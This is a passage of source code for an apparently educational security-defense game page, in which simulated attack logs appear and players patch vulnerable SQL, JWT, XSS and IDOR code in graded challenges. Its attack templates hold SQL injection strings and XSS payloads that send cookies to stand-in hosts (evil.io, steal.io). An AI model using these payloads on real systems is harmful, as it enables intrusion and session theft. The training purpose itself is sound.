"use client";

import { useEffect, useState, useRef, useCallback } from "react";

const PATCH_KEYS: Partial<Record<AttackType, string>> = {
  sqli: "patched_sqli",
  jwt_forge: "patched_jwt",
  xss: "patched_xss",
  idor: "patched_idor",
};

type Severity = "critical" | "high" | "medium" | "low";
type AttackType = "jwt_forge" | "sqli" | "idor" | "xss";
type FilterTab = "all" | "acknowledged" | "fixed";

type LogEntry = {
  id: string;
  ts: number;
  type: AttackType;
  severity: Severity;
  ip: string;
  port: number;
  user: string;
  detail: string;
  endpoint: string;
  method: string;
  statusCode: number;
  userAgent: string;
  payload: string;
  country: string;
  patched: boolean;
  detected: boolean;
};

type ScoreEntry = {
  points: number;
  ts: number;
  detail: string;
  type: AttackType;
};

type ChallengeResult = "idle" | "running" | "pass" | "fail";

type Challenge = {
  title: string;
  description: string;
  points: number;
  vulnerableCode: string;
  starterCode: string;
  validate: (code: string) => { pass: boolean; feedback: string };
  hint: string;
};

const CHALLENGES: Partial<Record<AttackType, Challenge>> = {
  sqli: {
    title: "Fix: SQL Injection in Login Route",
    description:
      "The login endpoint builds queries via string concatenation, allowing attackers to bypass authentication with admin'-- or ' OR '1'='1'--. Replace with a parameterized prepared statement.",
    points: 120,
    vulnerableCode: `// ❌ VULNERABLE — string concatenation
const query = \`SELECT * FROM users
  WHERE username='\${username}'
  AND password='\${password}'\`;
const [rows] = await db.query(query);`,
    starterCode: `// ✅ YOUR FIX — use parameterized queries
const query = "SELECT * FROM users WHERE username=? AND password=?";
const [rows] = await db.query(query, [/* your params here */]);`,
    validate: (code) => {
      const stillVulnerable =
        /`[^`]*\$\{username\}[^`]*`/.test(code) ||
        /`[^`]*\$\{password\}[^`]*`/.test(code);
      const hasPlaceholder =
        /WHERE username\s*=\s*\?/.test(code.replace(/\s+/g, " ")) ||
        /\?.*AND.*\?/.test(code.replace(/\s+/g, " "));
      const hasParams = /\[\s*(username|password)/.test(code);
      const usesConcat = /'\s*\+\s*(username|password)/.test(code);
      if (usesConcat)
        return {
          pass: false,
          feedback:
            "❌ Still concatenating strings — use ? placeholders instead.",
        };
      if (stillVulnerable)
        return {
          pass: false,
          feedback:
            "❌ Still using template literal interpolation — still injectable.",
        };
      if (!hasPlaceholder)
        return {
          pass: false,
          feedback:
            "❌ Missing ? placeholders. Replace ${username} and ${password} with ?.",
        };
      if (!hasParams)
        return {
          pass: false,
          feedback:
            "❌ Pass [username, password] as the second argument to db.query().",
        };
      return {
        pass: true,
        feedback: "✅ Correct! Parameterized queries separate data from code.",
      };
    },
    hint: 'Change the query to "SELECT * FROM users WHERE username=? AND password=?" and call db.query(query, [username, password]).',
  },
  jwt_forge: {
    title: "Fix: Weak JWT Verification",
    description:
      'The auth library accepts alg:"none" and uses a weak hardcoded secret. Fix jwt.verify() to enforce HS256 only and remove the fallback "secret".',
    points: 140,
    vulnerableCode: `// ❌ VULNERABLE
import jwt from 'jsonwebtoken';
export function getUserFromToken(token: string) {
  return jwt.verify(token, process.env.JWT_SECRET || 'secret');
}`,
    starterCode: `// ✅ YOUR FIX — enforce algorithm, remove weak fallback
import jwt from 'jsonwebtoken';
export function getUserFromToken(token: string) {
  return jwt.verify(token, process.env.JWT_SECRET!, {
    algorithms: [/* specify allowed algorithm here */],
  });
}`,
    validate: (code) => {
      const hasAlgorithms = /algorithms\s*:\s*\[/.test(code);
      const hasHS256 = /['"]HS256['"]/.test(code);
      const hasNone = /['"]none['"]/.test(code);
      const stillWeak = /\|\|\s*['"]secret['"]/.test(code);
      if (hasNone)
        return {
          pass: false,
          feedback: '❌ "none" is still in the algorithms list — remove it.',
        };
      if (stillWeak)
        return {
          pass: false,
          feedback:
            '❌ Still falling back to "secret". Use process.env.JWT_SECRET! instead.',
        };
      if (!hasAlgorithms)
        return {
          pass: false,
          feedback: "❌ Missing algorithms: [...] option in jwt.verify().",
        };
      if (!hasHS256)
        return {
          pass: false,
          feedback: '❌ Specify "HS256" as the only allowed algorithm.',
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Restricting to HS256 prevents algorithm confusion and alg:none attacks.",
      };
    },
    hint: 'Add algorithms: ["HS256"] to the options and remove the || "secret" fallback.',
  },
  xss: {
    title: "Fix: Stored XSS via dangerouslySetInnerHTML",
    description:
      "The transfer page renders user data via dangerouslySetInnerHTML, allowing script injection. Replace with safe React text rendering.",
    points: 100,
    vulnerableCode: `// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{
  __html: \`Transfer to <b>\${lastTransfer.toAccount}</b>
           completed. Note: \${lastTransfer.note}\`,
}} />
<div dangerouslySetInnerHTML={{ __html: u.username }} />`,
    starterCode: `// ✅ YOUR FIX — use safe React text rendering
<div>
  Transfer to <b>{lastTransfer.toAccount}</b> completed.
  {/* Render lastTransfer.note safely here */}
</div>
<div>
  {/* Render u.username safely */}
</div>`,
    validate: (code) => {
      const hasDangerous = /dangerouslySetInnerHTML/.test(code);
      const hasNoteRendered =
        /\{lastTransfer\.note\}/.test(code) || /\{note\}/.test(code);
      const hasUsernameRendered =
        /\{u\.username\}/.test(code) || /\{username\}/.test(code);
      if (hasDangerous)
        return {
          pass: false,
          feedback:
            "❌ dangerouslySetInnerHTML is still present — remove it entirely.",
        };
      if (!hasNoteRendered)
        return {
          pass: false,
          feedback:
            "❌ Render lastTransfer.note as a JSX text node: {lastTransfer.note}",
        };
      if (!hasUsernameRendered)
        return {
          pass: false,
          feedback: "❌ Render u.username as a JSX text node: {u.username}",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! JSX auto-escapes text nodes, preventing script injection.",
      };
    },
    hint: "Remove dangerouslySetInnerHTML and render values as {lastTransfer.note} and {u.username}.",
  },
  idor: {
    title: "Fix: IDOR in User Data Endpoint",
    description:
      "The /api/user route returns any user whose ID appears in the JWT without ownership verification. Add server-side checks and parameterize the query.",
    points: 110,
    vulnerableCode: `// ❌ VULNERABLE
export async function GET(req: NextRequest) {
  const token = req.headers.get('Authorization')?.replace('Bearer ', '');
  const decoded: any = getUserFromToken(token!);
  const [rows]: any = await db.query(
    \`SELECT * FROM users WHERE id=\${decoded.id}\`
  );
  return NextResponse.json({ success: true, user: rows[0] });
}`,
    starterCode: `// ✅ YOUR FIX — parameterize and verify ownership
export async function GET(req: NextRequest) {
  const token = req.headers.get('Authorization')?.replace('Bearer ', '');
  const decoded: any = getUserFromToken(token!);
  const [rows]: any = await db.query(
    'SELECT * FROM users WHERE id = ?', [decoded.id]
  );
  const user = rows[0];
  if (/* condition to detect id mismatch */) {
    return NextResponse.json(
      { success: false, message: 'Forbidden' },
      { status: /* correct HTTP status */ }
    );
  }
  return NextResponse.json({ success: true, user });
}`,
    validate: (code) => {
      const hasParamQuery =
        /query\s*\(\s*['"`]SELECT.*WHERE id\s*=\s*\?['"`]/.test(
          code.replace(/\s+/g, " "),
        );
      const has403 = /403/.test(code);
      const hasForbidden = /[Ff]orbidden/.test(code);
      const stillInterpolated =
        /WHERE id=\$\{/.test(code) || /WHERE id='\$/.test(code);
      if (stillInterpolated)
        return {
          pass: false,
          feedback: "❌ Still using string interpolation in the SQL query.",
        };
      if (!hasParamQuery)
        return {
          pass: false,
          feedback:
            "❌ Use: db.query('SELECT * FROM users WHERE id = ?', [decoded.id])",
        };
      if (!has403 || !hasForbidden)
        return {
          pass: false,
          feedback:
            "❌ Return a 403 Forbidden response when user.id !== decoded.id.",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Server-side ownership checks prevent IDOR even with forged JWTs.",
      };
    },
    hint: "Use db.query('...WHERE id = ?', [decoded.id]) and return { status: 403, message: 'Forbidden' } if user.id !== decoded.id.",
  },
};

function uid() {
  return Math.random().toString(36).slice(2, 10).toUpperCase();
}
function r(a: number, b: number) {
  return Math.floor(Math.random() * (b - a) + a);
}
function fakeIp() {
  return `${r(10, 210)}.${r(1, 254)}.${r(1, 254)}.${r(1, 254)}`;
}
function fakePort() {
  return [443, 8080, 3000, 8443, 80][r(0, 5)];
}

const COUNTRIES = ["CN", "RU", "KP", "IR", "US", "BR", "DE", "UA", "RO", "NG"];
const USER_AGENTS = [
  "sqlmap/1.7.8#stable",
  "python-requests/2.31.0",
  "curl/7.88.1",
  "Nikto/2.1.6",
  "Burp Suite Professional/2024",
  "Go-http-client/1.1",
];

const ATTACK_TEMPLATES: Omit<
  LogEntry,
  "id" | "ts" | "ip" | "port" | "patched" | "detected" | "userAgent" | "country"
>[] = [
  {
    type: "jwt_forge",
    severity: "critical",
    user: "0xDarkRoot",
    detail:
      'JWT payload forged: role escalated to "admin" via weak HS256 key bruteforce',
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: '{"alg":"HS256"}.{"id":1,"role":"admin","username":"0xDarkRoot"}',
  },
  {
    type: "jwt_forge",
    severity: "critical",
    user: "GhostProtocol_7",
    detail:
      'Algorithm confusion: JWT header modified to alg:"none", signature stripped',
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"alg":"none","typ":"JWT"}.{"id":7,"role":"admin"}. [empty sig]',
  },
  {
    type: "sqli",
    severity: "critical",
    user: "SQLSlayer99",
    detail:
      "Auth bypass — login succeeded with boolean tautology: ' OR '1'='1'-- ",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 200,
    payload: "username=' OR '1'='1'-- &password=doesntmatter",
  },
  {
    type: "sqli",
    severity: "critical",
    user: "ad_min_pwn",
    detail:
      "Auth bypass — admin account accessed via MySQL comment injection: admin'-- ",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 200,
    payload: "username=admin'-- &password=anything",
  },
  {
    type: "sqli",
    severity: "critical",
    user: "bl1nd_injector",
    detail:
      "Blind boolean-based SQLi — extracting password hash character by character",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- ",
  },
  {
    type: "sqli",
    severity: "high",
    user: "UnionJack_h4x",
    detail: "UNION-based SQLi — dumping table names from information_schema",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables-- ",
  },
  {
    type: "idor",
    severity: "high",
    user: "AccessAll_Area",
    detail:
      "IDOR: Sequential account_number enumeration exposing foreign account balances",
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: 'Authorization: Bearer <JWT with forged id=2 targeting "alice">',
  },
  {
    type: "idor",
    severity: "high",
    user: "ParamTamper_X",
    detail:
      "IDOR: Transfer routed to account not owned by the authenticated session",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"toAccount":"8829410","amount":"9999","note":"test"}',
  },
  {
    type: "xss",
    severity: "high",
    user: "XSSterminatorV2",
    detail:
      "Stored XSS in transfer note — exfiltrates session cookies via fetch() on victim load",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload:
      'note=<img src=x onerror=fetch("https://evil.io/?c="+document.cookie)>',
  },
  {
    type: "xss",
    severity: "medium",
    user: "ReflectedEvil",
    detail:
      "Reflected XSS in search — <script> rendered into DOM via dangerouslySetInnerHTML",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=<script>document.location='https://steal.io/?x='+document.cookie</script>",
  },
];

const SEV_CONFIG: Record<
  Severity,
  { color: string; bg: string; border: string; dot: string; label: string }
> = {
  critical: {
    color: "#b91c1c",
    bg: "#fff1f1",
    border: "#fca5a5",
    dot: "#ef4444",
    label: "CRITICAL",
  },
  high: {
    color: "#c2410c",
    bg: "#fff7ed",
    border: "#fdba74",
    dot: "#f97316",
    label: "HIGH",
  },
  medium: {
    color: "#a16207",
    bg: "#fefce8",
    border: "#fde047",
    dot: "#eab308",
    label: "MEDIUM",
  },
  low: {
    color: "#0d9488",
    bg: "#f0fdfa",
    border: "#5eead4",
    dot: "#14b8a6",
    label: "LOW",
  },
};

const TYPE_LABELS: Record<AttackType, string> = {
  jwt_forge: "JWT FORGERY",
  sqli: "SQL INJECTION",
  idor: "IDOR ATTACK",
  xss: "XSS INJECTION",
};

const TYPE_COLORS: Record<
  AttackType,
  { text: string; bg: string; border: string }
> = {
  jwt_forge: { text: "#7c3aed", bg: "#f5f3ff", border: "#c4b5fd" },
  sqli: { text: "#b91c1c", bg: "#fff1f1", border: "#fca5a5" },
  idor: { text: "#0369a1", bg: "#eff6ff", border: "#bae6fd" },
  xss: { text: "#c2410c", bg: "#fff7ed", border: "#fed7aa" },
};

export default function DefensePage() {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [selected, setSelected] = useState<string | null>(null);
  const [score, setScore] = useState(0);
  const [scoreHistory, setScoreHistory] = useState<ScoreEntry[]>([]);
  const [isRunning, setIsRunning] = useState(true);
  const [elapsed, setElapsed] = useState(0);
  const [alertFlash, setAlertFlash] = useState(false);
  const [toast, setToast] = useState<{ msg: string; ok: boolean } | null>(null);
  const [patchedTypes, setPatchedTypes] = useState<Set<AttackType>>(new Set());
  const [filterTab, setFilterTab] = useState<FilterTab>("all");

  // Challenge modal state
  const [challengeOpen, setChallengeOpen] = useState(false);
  const [challengeType, setChallengeType] = useState<AttackType | null>(null);
  const [challengeCode, setChallengeCode] = useState("");
  const [challengeResult, setChallengeResult] =
    useState<ChallengeResult>("idle");
  const [challengeFeedback, setChallengeFeedback] = useState("");
  const [showHint, setShowHint] = useState(false);
  const [showVulnerable, setShowVulnerable] = useState(false);

  const toastTimer = useRef<NodeJS.Timeout | null>(null);
  const seenRealIds = useRef<Set<string>>(new Set());
  const patchedTypesRef = useRef<Set<AttackType>>(new Set());

  useEffect(() => {
    patchedTypesRef.current = patchedTypes;
  }, [patchedTypes]);

  // Poll real attack log from other pages
  useEffect(() => {
    const poll = setInterval(() => {
      try {
        const raw = localStorage.getItem("real_attack_log");
        if (!raw) return;
        const events: LogEntry[] = JSON.parse(raw);
        const fresh = events.filter((e) => !seenRealIds.current.has(e.id));
        if (!fresh.length) return;
        fresh.forEach((e) => seenRealIds.current.add(e.id));
        setLogs((prev) => [...fresh, ...prev].slice(0, 150));
        if (fresh.some((e) => e.severity === "critical")) {
          setAlertFlash(true);
          setTimeout(() => setAlertFlash(false), 600);
        }
      } catch {
        /* ignore */
      }
    }, 600);
    return () => clearInterval(poll);
  }, []);

  const spawnAttack = useCallback(() => {
    const available = ATTACK_TEMPLATES.filter(
      (t) => !patchedTypesRef.current.has(t.type),
    );
    if (!available.length) return;
    const tpl = available[r(0, available.length)];
    const entry: LogEntry = {
      ...tpl,
      id: uid(),
      ts: Date.now(),
      ip: fakeIp(),
      port: fakePort(),
      country: COUNTRIES[r(0, COUNTRIES.length)],
      userAgent: USER_AGENTS[r(0, USER_AGENTS.length)],
      patched: false,
      detected: false,
    };
    setLogs((prev) => [entry, ...prev].slice(0, 150));
    if (entry.severity === "critical") {
      setAlertFlash(true);
      setTimeout(() => setAlertFlash(false), 600);
    }
  }, []);

  useEffect(() => {
    if (isRunning) {
      spawnAttack();
      const t = setInterval(spawnAttack, 6000);
      return () => clearInterval(t);
    }
  }, [isRunning, spawnAttack]);

  useEffect(() => {
    const t = setInterval(() => {
      if (isRunning) setElapsed((e) => e + 1);
    }, 1000);
    return () => clearInterval(t);
  }, [isRunning]);

  const selectedLog = logs.find((l) => l.id === selected);
  const challenge = challengeType ? CHALLENGES[challengeType] : null;

  function showToast(msg: string, ok = true) {
    setToast({ msg, ok });
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), 2800);
  }

  function acknowledge(logId: string) {
    const log = logs.find((l) => l.id === logId);
    if (!log) return;
    if (log.detected) {
      showToast("Already acknowledged", false);
      return;
    }
    setLogs((prev) =>
      prev.map((l) => (l.id === logId ? { ...l, detected: true } : l)),
    );
    // No points for acknowledging
    showToast("Threat acknowledged — now deploy a hotfix to score");
  }

  function openPatch(logId: string) {
    const log = logs.find((l) => l.id === logId);
    if (!log) return;
    if (!log.detected) {
      showToast("Acknowledge the threat first", false);
      return;
    }
    if (patchedTypes.has(log.type)) {
      showToast("This vulnerability is already patched globally", false);
      return;
    }
    const ch = CHALLENGES[log.type];
    if (ch) {
      setChallengeType(log.type);
      setChallengeCode(ch.starterCode);
      setChallengeResult("idle");
      setChallengeOpen(true);
      setShowHint(false);
      setShowVulnerable(false);
      setChallengeFeedback("");
    }
  }

  // ── Drop this into your DefensePage's submitChallenge() function ──────────
  // Replace the existing submitChallenge() with this version.
  // The only addition is the fetch() call to /api/patch after a pass,
  // which writes a server-side flag file so the API routes also switch
  // to parameterized queries.

  const PATCH_TARGET_MAP: Partial<Record<AttackType, string>> = {
    sqli: "sqli",
    jwt_forge: "jwt",
    xss: "xss",
    idor: "idor",
  };

  function submitChallenge() {
    if (!challengeType || !challenge) return;
    setChallengeResult("running");

    setTimeout(() => {
      const result = challenge.validate(challengeCode);
      setChallengeResult(result.pass ? "pass" : "fail");
      setChallengeFeedback(result.feedback);

      if (result.pass) {
        // 1. Mark all logs of this type as patched in UI
        setLogs((prev) =>
          prev.map((l) =>
            l.type === challengeType ? { ...l, patched: true } : l,
          ),
        );

        // 2. Add to patched set so new attacks stop spawning
        setPatchedTypes((prev) => new Set([...prev, challengeType]));

        // 3. Write localStorage key so other pages (login, search, profile) show banners
        const lsKey = PATCH_KEYS[challengeType];
        if (lsKey) localStorage.setItem(lsKey, "1");

        // 4. ── NEW: Write server-side flag so API routes switch to safe queries ──
        const apiTarget = PATCH_TARGET_MAP[challengeType];
        if (apiTarget) {
          fetch("/api/patch", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target: apiTarget, action: "apply" }),
          }).catch(() => {
            // Non-critical — client-side patch still works even if this fails
            console.warn(
              "[patch] Server-side flag write failed — client-side patch still active",
            );
          });
        }

        // 5. Award points and update ledger
        const pts = challenge.points;
        setScore((s) => s + pts);
        setScoreHistory((h) =>
          [
            {
              points: pts,
              ts: Date.now(),
              detail: `${TYPE_LABELS[challengeType]} patched globally`,
              type: challengeType,
            },
            ...h,
          ].slice(0, 30),
        );
      }
    }, 700);
  }

  function closeChallenge() {
    setChallengeOpen(false);
    setChallengeType(null);
    setChallengeResult("idle");
    setChallengeFeedback("");
    setShowHint(false);
    setShowVulnerable(false);
  }

  const fmt = (ts: number) =>
    new Date(ts).toLocaleTimeString("en-US", {
      hour12: false,
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  const fmtEl = (s: number) =>
    `${Math.floor(s / 60)
      .toString()
      .padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;

  const critCount = logs.filter(
    (l) => l.severity === "critical" && !patchedTypes.has(l.type),
  ).length;

  const filteredLogs = logs.filter((l) => {
    const isGP = patchedTypes.has(l.type);
    if (filterTab === "acknowledged") return l.detected && !isGP;
    if (filterTab === "fixed") return isGP;
    return true;
  });

  const tabCounts = {
    all: logs.length,
    acknowledged: logs.filter((l) => l.detected && !patchedTypes.has(l.type))
      .length,
    fixed: logs.filter((l) => patchedTypes.has(l.type)).length,
  };

  // ── Styles ────────────────────────────────────────────────────────────────
  const mono = "'JetBrains Mono', 'Fira Code', monospace";
  const sans = "'IBM Plex Sans', system-ui, sans-serif";

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#0f0f11",
        fontFamily: sans,
        color: "#e8e6e1",
        display: "flex",
        flexDirection: "column",
        fontSize: 13,
      }}
    >
      {alertFlash && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            border: "2px solid #ef4444",
            pointerEvents: "none",
            zIndex: 9999,
            animation: "redflash 0.5s ease-out forwards",
          }}
        />
      )}

      {/* ── CHALLENGE MODAL ───────────────────────────────────────── */}
      {challengeOpen && challenge && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.75)",
            backdropFilter: "blur(6px)",
            zIndex: 1000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: 24,
          }}
        >
          <div
            style={{
              width: "100%",
              maxWidth: 980,
              background: "#16161a",
              border: "1px solid #2a2a30",
              borderRadius: 16,
              display: "flex",
              flexDirection: "column",
              maxHeight: "94vh",
              overflow: "hidden",
              boxShadow: "0 32px 64px rgba(0,0,0,0.6)",
            }}
          >
            {/* Modal header */}
            <div
              style={{
                padding: "20px 28px",
                borderBottom: "1px solid #1e1e24",
                background: "#111115",
                flexShrink: 0,
                display: "flex",
                justifyContent: "space-between",
                alignItems: "flex-start",
              }}
            >
              <div>
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    marginBottom: 8,
                  }}
                >
                  <span
                    style={{
                      fontSize: 10,
                      fontWeight: 700,
                      letterSpacing: "0.14em",
                      color: "#4ade80",
                      background: "rgba(74,222,128,0.1)",
                      padding: "3px 9px",
                      borderRadius: 4,
                      border: "1px solid rgba(74,222,128,0.2)",
                    }}
                  >
                    HOTFIX CHALLENGE
                  </span>
                  {challengeType && (
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        letterSpacing: "0.1em",
                        color: TYPE_COLORS[challengeType].text,
                        background: TYPE_COLORS[challengeType].bg,
                        padding: "3px 9px",
                        borderRadius: 4,
                        border: `1px solid ${TYPE_COLORS[challengeType].border}`,
                      }}
                    >
                      {TYPE_LABELS[challengeType]}
                    </span>
                  )}
                </div>
                <div
                  style={{
                    fontSize: 20,
                    fontWeight: 700,
                    color: "#f0ece4",
                    letterSpacing: "-0.02em",
                    marginBottom: 6,
                  }}
                >
                  {challenge.title}
                </div>
                <div
                  style={{
                    fontSize: 13,
                    color: "#8b8480",
                    lineHeight: 1.65,
                    maxWidth: 560,
                  }}
                >
                  {challenge.description}
                </div>
              </div>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 16,
                  flexShrink: 0,
                  marginLeft: 24,
                }}
              >
                <div
                  style={{
                    textAlign: "center",
                    background: "rgba(74,222,128,0.08)",
                    border: "1px solid rgba(74,222,128,0.2)",
                    borderRadius: 10,
                    padding: "10px 18px",
                  }}
                >
                  <div
                    style={{
                      fontSize: 10,
                      color: "#4ade80",
                      fontWeight: 700,
                      letterSpacing: "0.1em",
                      marginBottom: 2,
                    }}
                  >
                    REWARD
                  </div>
                  <div
                    style={{
                      fontSize: 26,
                      fontWeight: 800,
                      color: "#4ade80",
                      letterSpacing: "-0.03em",
                    }}
                  >
                    +{challenge.points}
                  </div>
                </div>
                <button
                  onClick={closeChallenge}
                  style={{
                    fontFamily: sans,
                    background: "transparent",
                    border: "1px solid #2a2a30",
                    borderRadius: 8,
                    padding: "8px 14px",
                    color: "#78716c",
                    cursor: "pointer",
                    fontSize: 12,
                    fontWeight: 600,
                    letterSpacing: "0.04em",
                  }}
                >
                  ESC ✕
                </button>
              </div>
            </div>

            {/* Modal body */}
            <div style={{ display: "flex", flex: 1, minHeight: 0 }}>
              {/* Left — code editor area */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  minWidth: 0,
                  background: "#0d0d10",
                }}
              >
                {/* Vuln toggle bar */}
                <div
                  style={{
                    padding: "10px 20px",
                    borderBottom: "1px solid #1e1e24",
                    flexShrink: 0,
                    display: "flex",
                    alignItems: "center",
                    gap: 12,
                  }}
                >
                  <button
                    onClick={() => setShowVulnerable((v) => !v)}
                    style={{
                      fontFamily: sans,
                      background: showVulnerable
                        ? "rgba(239,68,68,0.12)"
                        : "transparent",
                      border: `1px solid ${showVulnerable ? "rgba(239,68,68,0.35)" : "#2a2a30"}`,
                      borderRadius: 6,
                      padding: "5px 12px",
                      color: showVulnerable ? "#f87171" : "#6b6b70",
                      cursor: "pointer",
                      fontSize: 11,
                      fontWeight: 700,
                      letterSpacing: "0.06em",
                      transition: "all 0.15s",
                    }}
                  >
                    {showVulnerable ? "▲ HIDE VULN CODE" : "▼ SHOW VULN CODE"}
                  </button>
                  <button
                    onClick={() => setShowHint((h) => !h)}
                    style={{
                      fontFamily: sans,
                      background: showHint
                        ? "rgba(251,191,36,0.1)"
                        : "transparent",
                      border: `1px solid ${showHint ? "rgba(251,191,36,0.3)" : "#2a2a30"}`,
                      borderRadius: 6,
                      padding: "5px 12px",
                      color: showHint ? "#fbbf24" : "#6b6b70",
                      cursor: "pointer",
                      fontSize: 11,
                      fontWeight: 700,
                      letterSpacing: "0.06em",
                      transition: "all 0.15s",
                    }}
                  >
                    💡 {showHint ? "HIDE HINT" : "NEED A HINT?"}
                  </button>
                </div>

                {/* Vulnerable code */}
                {showVulnerable && (
                  <div
                    style={{
                      padding: "14px 20px",
                      background: "rgba(239,68,68,0.05)",
                      borderBottom: "1px solid rgba(239,68,68,0.15)",
                      flexShrink: 0,
                    }}
                  >
                    <div
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        color: "#f87171",
                        letterSpacing: "0.1em",
                        marginBottom: 8,
                      }}
                    >
                      ❌ VULNERABLE CODE
                    </div>
                    <pre
                      style={{
                        margin: 0,
                        fontSize: 12,
                        color: "#fca5a5",
                        lineHeight: 1.7,
                        whiteSpace: "pre-wrap",
                        wordBreak: "break-all",
                        fontFamily: mono,
                      }}
                    >
                      {challenge.vulnerableCode}
                    </pre>
                  </div>
                )}

                {/* Hint */}
                {showHint && (
                  <div
                    style={{
                      padding: "12px 20px",
                      background: "rgba(251,191,36,0.05)",
                      borderBottom: "1px solid rgba(251,191,36,0.15)",
                      flexShrink: 0,
                      fontSize: 13,
                      color: "#fbbf24",
                      lineHeight: 1.6,
                    }}
                  >
                    💡 {challenge.hint}
                  </div>
                )}

                {/* Editor label */}
                <div
                  style={{
                    padding: "10px 20px 0",
                    flexShrink: 0,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                  }}
                >
                  <div
                    style={{ display: "flex", alignItems: "center", gap: 8 }}
                  >
                    <div
                      style={{
                        width: 8,
                        height: 8,
                        borderRadius: "50%",
                        background: "#4ade80",
                      }}
                    />
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        color: "#4ade80",
                        letterSpacing: "0.1em",
                      }}
                    >
                      YOUR FIX
                    </span>
                  </div>
                  <span
                    style={{ fontSize: 10, color: "#3a3a42", fontFamily: mono }}
                  >
                    hotfix.ts
                  </span>
                </div>

                {/* Textarea */}
                <textarea
                  value={challengeCode}
                  onChange={(e) => {
                    setChallengeCode(e.target.value);
                    if (challengeResult !== "pass") {
                      setChallengeResult("idle");
                      setChallengeFeedback("");
                    }
                  }}
                  spellCheck={false}
                  style={{
                    flex: 1,
                    background: "#0d0d10",
                    color: "#d4d0c8",
                    fontFamily: mono,
                    fontSize: 13,
                    lineHeight: 1.8,
                    padding: "12px 20px 20px",
                    border: "none",
                    outline: "none",
                    resize: "none",
                    minHeight: 220,
                    tabSize: 2,
                  }}
                />
              </div>

              {/* Right — validator panel */}
              <div
                style={{
                  width: 300,
                  flexShrink: 0,
                  display: "flex",
                  flexDirection: "column",
                  borderLeft: "1px solid #1e1e24",
                  background: "#111115",
                }}
              >
                {/* Run button area */}
                <div
                  style={{
                    padding: "20px",
                    borderBottom: "1px solid #1e1e24",
                    flexShrink: 0,
                  }}
                >
                  <button
                    onClick={submitChallenge}
                    disabled={
                      challengeResult === "running" ||
                      challengeResult === "pass"
                    }
                    style={{
                      fontFamily: sans,
                      width: "100%",
                      padding: "13px",
                      borderRadius: 8,
                      fontSize: 13,
                      fontWeight: 700,
                      letterSpacing: "0.04em",
                      border: "none",
                      cursor:
                        challengeResult === "pass"
                          ? "default"
                          : challengeResult === "running"
                            ? "wait"
                            : "pointer",
                      background:
                        challengeResult === "pass"
                          ? "rgba(74,222,128,0.12)"
                          : challengeResult === "running"
                            ? "#1e1e24"
                            : "#4ade80",
                      color:
                        challengeResult === "pass"
                          ? "#4ade80"
                          : challengeResult === "running"
                            ? "#3a3a42"
                            : "#0a1a0a",
                      transition: "all 0.15s",
                    }}
                  >
                    {challengeResult === "running"
                      ? "⟳  Validating…"
                      : challengeResult === "pass"
                        ? "✓  Fix Deployed!"
                        : "▶  Run Validator"}
                  </button>

                  {challengeFeedback && (
                    <div
                      style={{
                        marginTop: 12,
                        padding: "11px 14px",
                        borderRadius: 7,
                        fontSize: 12,
                        lineHeight: 1.65,
                        ...(challengeResult === "pass"
                          ? {
                              background: "rgba(74,222,128,0.08)",
                              border: "1px solid rgba(74,222,128,0.2)",
                              color: "#4ade80",
                            }
                          : {
                              background: "rgba(239,68,68,0.08)",
                              border: "1px solid rgba(239,68,68,0.2)",
                              color: "#f87171",
                            }),
                      }}
                    >
                      {challengeFeedback}
                    </div>
                  )}
                </div>

                {/* Effects */}
                <div style={{ padding: "20px", overflowY: "auto", flex: 1 }}>
                  <div
                    style={{
                      fontSize: 10,
                      fontWeight: 700,
                      letterSpacing: "0.1em",
                      color: "#3a3a42",
                      marginBottom: 14,
                    }}
                  >
                    ON PASS — GLOBAL EFFECTS
                  </div>
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: 10,
                    }}
                  >
                    {[
                      {
                        icon: "⬛",
                        text: `All ${challengeType ? TYPE_LABELS[challengeType] : ""} logs marked fixed`,
                      },
                      {
                        icon: "◼",
                        text: "New attacks of this type stop spawning",
                      },
                      challengeType === "sqli"
                        ? {
                            icon: "◼",
                            text: "Login page shows patch banner live",
                          }
                        : null,
                      challengeType === "jwt_forge"
                        ? {
                            icon: "◼",
                            text: "Profile page blocks forge attempts live",
                          }
                        : null,
                      {
                        icon: "◆",
                        text: `+${challenge.points} pts added to your score`,
                      },
                    ]
                      .filter(Boolean)
                      .map((item, i) => (
                        <div
                          key={i}
                          style={{
                            display: "flex",
                            gap: 10,
                            alignItems: "flex-start",
                          }}
                        >
                          <span
                            style={{
                              fontSize: 8,
                              color: "#3a3a42",
                              marginTop: 4,
